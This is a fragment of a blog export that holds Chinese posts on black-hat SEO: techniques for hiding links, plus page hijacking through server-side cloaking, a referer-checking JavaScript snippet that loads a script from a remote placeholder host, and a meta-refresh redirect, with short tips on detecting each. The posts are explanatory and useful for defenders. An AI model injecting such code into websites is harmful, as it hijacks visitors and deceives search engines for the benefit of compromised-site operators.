class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"display:none;\"</span>&gt;</div><div class=\"line\">&lt;a href=http://thief.one/ &gt;暗链&lt;/a&gt;</div><div class=\"line\">&lt;/div&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。</p>\n<h4 id=\"color-font-size-line-height属性\"><a href=\"#color-font-size-line-height属性\" class=\"headerlink\" title=\"color/font-size/line-height属性\"></a>color/font-size/line-height属性</h4><p>将color颜色设置与页面背景色一样，大小设置为小于或等于1。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;a href=http://thief.one style=<span class=\"string\">\"color:#FFFFFF;font-size:1px;line-height:1px ;\"</span>&gt;暗链&lt;/a&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：最初级的隐蔽链接，易被搜索引擎察觉。</p>\n<h4 id=\"position属性\"><a href=\"#position属性\" class=\"headerlink\" title=\"position属性\"></a>position属性</h4><p>将position位置属性设置成负数，使内容位于页面可见范围以外。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"position: absolute; top: -999px;left: -999px;\"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"position:absolute;left:expression_r(1-900);top:expression_r(3-999);\"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>\n<p>分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。</p>\n<h4 id=\"marquee属性\"><a href=\"#marquee属性\" class=\"headerlink\" title=\"marquee属性\"></a>marquee属性</h4><p>设置marquee滚动标签属性，使之快速闪现。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/marquee&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。</p>\n<h3 id=\"利用JS实现挂暗链\"><a href=\"#利用JS实现挂暗链\" class=\"headerlink\" title=\"利用JS实现挂暗链\"></a>利用JS实现挂暗链</h3><p>利用js向页面中写入css代码，设置属性。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">document.write(<span class=\"string\">\"&lt;div style='display:none;'&gt;\"</span>);</div><div class=\"line\">&lt;/script&gt;&lt;div&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;a href=http://thief.one&gt;暗链&lt;/a&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">document.write(<span class=\"string\">\"&lt;/div&gt;\"</span>);</div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。</p>\n<h3 id=\"利用DIV-JS实现挂暗链\"><a href=\"#利用DIV-JS实现挂暗链\" class=\"headerlink\" title=\"利用DIV+JS实现挂暗链\"></a>利用DIV+JS实现挂暗链</h3><p>利用div与js功能，修改属性。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div id=<span class=\"string\">\"anlian\"</span>&gt;&lt;a href=<span class=\"string\">\"http://thief.one\"</span>&gt;暗链&lt;/a&gt;&lt;/div&gt;</div><div class=\"line\">&lt;script language=javascript&gt;</div><div class=\"line\">document.getElementById(<span class=\"string\">\"anlian\"</span>).style.display=<span class=\"string\">\"none\"</span></div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。</p>\n<h3 id=\"挂暗链高级姿势\"><a href=\"#挂暗链高级姿势\" class=\"headerlink\" title=\"挂暗链高级姿势\"></a>挂暗链高级姿势</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div class=<span class=\"string\">\"father\"</span> style=<span class=\"string\">\"position:relative\"</span>&gt;</div><div class=\"line\">　　&lt;div class=<span class=\"string\">\"topLever\"</span> style=<span class=\"string\">\"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee\"</span>&gt;遮挡层：可以放图片或者Flash&lt;/div&gt;</div><div class=\"line\">　　&lt;div class=<span class=\"string\">\"hideDontent\"</span>&gt;隐蔽层：可以放暗链链接&lt;/div&gt;</div><div class=\"line\">&lt;/div&gt;</div></pre></td></tr></table></figure>\n<p>分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。</p>\n<p>结语：<em>暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！</em></p>\n","excerpt":"","more":"<p>　　暗链也称为<em>黑链</em>，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。</p>\n<p>　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。</p>\n<h3 id=\"利用CSS实现挂暗链\"><a href=\"#利用CSS实现挂暗链\" class=\"headerlink\" title=\"利用CSS实现挂暗链\"></a>利用CSS实现挂暗链</h3><h4 id=\"display属性\"><a href=\"#display属性\" class=\"headerlink\" title=\"display属性\"></a>display属性</h4><p>将display属性设置为none，则页面上不显示此内容。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"display:none;\"</span>&gt;</div><div class=\"line\">&lt;a href=http://thief.one/ &gt;暗链&lt;/a&gt;</div><div class=\"line\">&lt;/div&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。</p>\n<h4 id=\"color-font-size-line-height属性\"><a href=\"#color-font-size-line-height属性\" class=\"headerlink\" title=\"color/font-size/line-height属性\"></a>color/font-size/line-height属性</h4><p>将color颜色设置与页面背景色一样，大小设置为小于或等于1。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;a href=http://thief.one style=<span class=\"string\">\"color:#FFFFFF;font-size:1px;line-height:1px ;\"</span>&gt;暗链&lt;/a&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：最初级的隐蔽链接，易被搜索引擎察觉。</p>\n<h4 id=\"position属性\"><a href=\"#position属性\" class=\"headerlink\" title=\"position属性\"></a>position属性</h4><p>将position位置属性设置成负数，使内容位于页面可见范围以外。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"position: absolute; top: -999px;left: -999px;\"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div style=<span class=\"string\">\"position:absolute;left:expression_r(1-900);top:expression_r(3-999);\"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>\n<p>分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。</p>\n<h4 id=\"marquee属性\"><a href=\"#marquee属性\" class=\"headerlink\" title=\"marquee属性\"></a>marquee属性</h4><p>设置marquee滚动标签属性，使之快速闪现。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/marquee&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。</p>\n<h3 id=\"利用JS实现挂暗链\"><a href=\"#利用JS实现挂暗链\" class=\"headerlink\" title=\"利用JS实现挂暗链\"></a>利用JS实现挂暗链</h3><p>利用js向页面中写入css代码，设置属性。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">document.write(<span class=\"string\">\"&lt;div style='display:none;'&gt;\"</span>);</div><div class=\"line\">&lt;/script&gt;&lt;div&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;a href=http://thief.one&gt;暗链&lt;/a&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">document.write(<span class=\"string\">\"&lt;/div&gt;\"</span>);</div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。</p>\n<h3 id=\"利用DIV-JS实现挂暗链\"><a href=\"#利用DIV-JS实现挂暗链\" class=\"headerlink\" title=\"利用DIV+JS实现挂暗链\"></a>利用DIV+JS实现挂暗链</h3><p>利用div与js功能，修改属性。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div id=<span class=\"string\">\"anlian\"</span>&gt;&lt;a href=<span class=\"string\">\"http://thief.one\"</span>&gt;暗链&lt;/a&gt;&lt;/div&gt;</div><div class=\"line\">&lt;script language=javascript&gt;</div><div class=\"line\">document.getElementById(<span class=\"string\">\"anlian\"</span>).style.display=<span class=\"string\">\"none\"</span></div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。</p>\n<h3 id=\"挂暗链高级姿势\"><a href=\"#挂暗链高级姿势\" class=\"headerlink\" title=\"挂暗链高级姿势\"></a>挂暗链高级姿势</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div class=<span class=\"string\">\"father\"</span> style=<span class=\"string\">\"position:relative\"</span>&gt;</div><div class=\"line\">　　&lt;div class=<span class=\"string\">\"topLever\"</span> style=<span class=\"string\">\"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee\"</span>&gt;遮挡层：可以放图片或者Flash&lt;/div&gt;</div><div class=\"line\">　　&lt;div class=<span class=\"string\">\"hideDontent\"</span>&gt;隐蔽层：可以放暗链链接&lt;/div&gt;</div><div class=\"line\">&lt;/div&gt;</div></pre></td></tr></table></figure>\n<p>分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。</p>\n<p>结语：<em>暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！</em></p>\n"},{"title":"黑帽SEO之网页劫持","date":"2016-10-12T02:25:13.000Z","comments":1,"_content":"　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。\n\n### 服务端劫持\n服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。\n#### asp/aspx/php劫持\n　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。\n\n### 客户端劫持\n客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。\n#### js劫持\njs劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。\njs植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。\n#### js劫持案例\n效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。\n代码：\n```bash\ntoday=new Date();\ntoday=today.getYear()+\"-\"+(today.getMonth()+1)+\"-\"+today.getDate();\nvar regexp=/\\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\\.[a-z0-9\\-]+){1,2}\\//ig;\nvar where =document.referer;\nif(regexp.test(where)){\ndocument.write ('<script language=\"javascript\" type=\"text/javascript\" src=\"http://www.xxx.com/test.js\"></script>');\n}\nelse\n{\nwindow.location.href=\"../../404.htm\";\n}\n```\n分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。\n#### header劫持\n在源代码中写入以下代码：\n```bash\n<meta http-equiv=“refresh“ content=“10; url=http://thief.one“>\n```\n利用的就是Meta Refresh Tag（自动转向），将流量引走。\n\n### 手法对比\n#### 客户端劫持与服务端区别\n客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。\n服务端劫持：改变了每次访问网页从服务端获取到的网页代码。\n#### 客户端劫持与服务端判断方法\n客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。\n服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。\n\n结语：*网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。*\n","source":"_posts/黑帽SEO之网页劫持.md","raw":"---\ntitle: 黑帽SEO之网页劫持\ndate: 2016-10-12 10:25:13\ncomments: true\ntags: 黑帽SEO\ncategories: 技术交流\n---\n　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。\n\n### 服务端劫持\n服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。\n#### asp/aspx/php劫持\n　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。\n\n### 客户端劫持\n客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。\n#### js劫持\njs劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。\njs植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。\n#### js劫持案例\n效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。\n代码：\n```bash\ntoday=new Date();\ntoday=today.getYear()+\"-\"+(today.getMonth()+1)+\"-\"+today.getDate();\nvar regexp=/\\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\\.[a-z0-9\\-]+){1,2}\\//ig;\nvar where =document.referer;\nif(regexp.test(where)){\ndocument.write ('<script language=\"javascript\" type=\"text/javascript\" src=\"http://www.xxx.com/test.js\"></script>');\n}\nelse\n{\nwindow.location.href=\"../../404.htm\";\n}\n```\n分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。\n#### header劫持\n在源代码中写入以下代码：\n```bash\n<meta http-equiv=“refresh“ content=“10; url=http://thief.one“>\n```\n利用的就是Meta Refresh Tag（自动转向），将流量引走。\n\n### 手法对比\n#### 客户端劫持与服务端区别\n客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。\n服务端劫持：改变了每次访问网页从服务端获取到的网页代码。\n#### 客户端劫持与服务端判断方法\n客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。\n服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。\n\n结语：*网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。*\n","slug":"黑帽SEO之网页劫持","published":1,"updated":"2017-02-14T01:12:03.340Z","layout":"post","photos":[],"link":"","_id":"ciz80dyca001y3ofvm6j3ay5g","content":"<p>　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。</p>\n<h3 id=\"服务端劫持\"><a href=\"#服务端劫持\" class=\"headerlink\" title=\"服务端劫持\"></a>服务端劫持</h3><p>服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。</p>\n<h4 id=\"asp-aspx-php劫持\"><a href=\"#asp-aspx-php劫持\" class=\"headerlink\" title=\"asp/aspx/php劫持\"></a>asp/aspx/php劫持</h4><p>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。</p>\n<h3 id=\"客户端劫持\"><a href=\"#客户端劫持\" class=\"headerlink\" title=\"客户端劫持\"></a>客户端劫持</h3><p>客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。</p>\n<h4 id=\"js劫持\"><a href=\"#js劫持\" class=\"headerlink\" title=\"js劫持\"></a>js劫持</h4><p>js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。<br>js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>\n<h4 id=\"js劫持案例\"><a href=\"#js劫持案例\" class=\"headerlink\" title=\"js劫持案例\"></a>js劫持案例</h4><p>效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。<br>代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">today=new Date();</div><div class=\"line\">today=today.getYear()+<span class=\"string\">\"-\"</span>+(today.getMonth()+1)+<span class=\"string\">\"-\"</span>+today.getDate();</div><div class=\"line\">var regexp=/\\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\\.[a-z0-9\\-]+)&#123;1,2&#125;\\//ig;</div><div class=\"line\">var <span class=\"built_in\">where</span> =document.referer;</div><div class=\"line\"><span class=\"keyword\">if</span>(regexp.test(<span class=\"built_in\">where</span>))&#123;</div><div class=\"line\">document.write (<span class=\"string\">'&lt;script language=\"javascript\" type=\"text/javascript\" src=\"http://www.xxx.com/test.js\"&gt;&lt;/script&gt;'</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">window.location.href=<span class=\"string\">\"../../404.htm\"</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>\n<h4 id=\"header劫持\"><a href=\"#header劫持\" class=\"headerlink\" title=\"header劫持\"></a>header劫持</h4><p>在源代码中写入以下代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;meta http-equiv=“refresh“ content=“10; url=http://thief.one“&gt;</div></pre></td></tr></table></figure></p>\n<p>利用的就是Meta Refresh Tag（自动转向），将流量引走。</p>\n<h3 id=\"手法对比\"><a href=\"#手法对比\" class=\"headerlink\" title=\"手法对比\"></a>手法对比</h3><h4 id=\"客户端劫持与服务端区别\"><a href=\"#客户端劫持与服务端区别\" class=\"headerlink\" title=\"客户端劫持与服务端区别\"></a>客户端劫持与服务端区别</h4><p>客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。<br>服务端劫持：改变了每次访问网页从服务端获取到的网页代码。</p>\n<h4 id=\"客户端劫持与服务端判断方法\"><a href=\"#客户端劫持与服务端判断方法\" class=\"headerlink\" title=\"客户端劫持与服务端判断方法\"></a>客户端劫持与服务端判断方法</h4><p>客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。<br>服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。</p>\n<p>结语：<em>网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。</em></p>\n","excerpt":"","more":"<p>　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。</p>\n<h3 id=\"服务端劫持\"><a href=\"#服务端劫持\" class=\"headerlink\" title=\"服务端劫持\"></a>服务端劫持</h3><p>服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。</p>\n<h4 id=\"asp-aspx-php劫持\"><a href=\"#asp-aspx-php劫持\" class=\"headerlink\" title=\"asp/aspx/php劫持\"></a>asp/aspx/php劫持</h4><p>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。</p>\n<h3 id=\"客户端劫持\"><a href=\"#客户端劫持\" class=\"headerlink\" title=\"客户端劫持\"></a>客户端劫持</h3><p>客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。</p>\n<h4 id=\"js劫持\"><a href=\"#js劫持\" class=\"headerlink\" title=\"js劫持\"></a>js劫持</h4><p>js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。<br>js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>\n<h4 id=\"js劫持案例\"><a href=\"#js劫持案例\" class=\"headerlink\" title=\"js劫持案例\"></a>js劫持案例</h4><p>效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。<br>代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">today=new Date();</div><div class=\"line\">today=today.getYear()+<span class=\"string\">\"-\"</span>+(today.getMonth()+1)+<span class=\"string\">\"-\"</span>+today.getDate();</div><div class=\"line\">var regexp=/\\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\\.[a-z0-9\\-]+)&#123;1,2&#125;\\//ig;</div><div class=\"line\">var <span class=\"built_in\">where</span> =document.referer;</div><div class=\"line\"><span class=\"keyword\">if</span>(regexp.test(<span class=\"built_in\">where</span>))&#123;</div><div class=\"line\">document.write (<span class=\"string\">'&lt;script language=\"javascript\" type=\"text/javascript\" src=\"http://www.xxx.com/test.js\"&gt;&lt;/script&gt;'</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">window.location.href=<span class=\"string\">\"../../404.htm\"</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>\n<h4 id=\"header劫持\"><a href=\"#header劫持\" class=\"headerlink\" title=\"header劫持\"></a>header劫持</h4><p>在源代码中写入以下代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;meta http-equiv=“refresh“ content=“10; url=http://thief.one“&gt;</div></pre></td></tr></table></figure></p>\n<p>利用的就是Meta Refresh Tag（自动转向），将流量引走。</p>\n<h3 id=\"手法对比\"><a href=\"#手法对比\" class=\"headerlink\" title=\"手法对比\"></a>手法对比</h3><h4 id=\"客户端劫持与服务端区别\"><a href=\"#客户端劫持与服务端区别\" class=\"headerlink\" title=\"客户端劫持与服务端区别\"></a>客户端劫持与服务端区别</h4><p>客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。<br>服务端劫持：改变了每次访问网页从服务端获取到的网页代码。</p>\n<h4 id=\"客户端劫持与服务端判断方法\"><a 